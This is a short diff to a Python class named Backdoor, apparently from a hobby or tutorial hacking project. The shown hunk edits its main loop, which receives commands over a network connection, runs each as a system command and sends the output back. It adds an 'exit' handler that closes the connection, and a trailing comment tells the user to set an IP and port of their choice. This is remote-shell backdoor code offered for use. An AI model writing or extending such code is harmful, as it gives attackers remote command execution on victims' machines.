@@ -37,10 +37,13 @@ class Backdoor:
     def run(self):
         while True:
             received_command = self.reliable_receive()
+
+            if received_command[0] == "exit":
+                self.connection.close()
+                exit()
+
             command_result = self.execute_system_command(received_command)
             self.reliable_send(command_result)
-
-        connection.close()
 
 
 # Replace ip and port of your choice
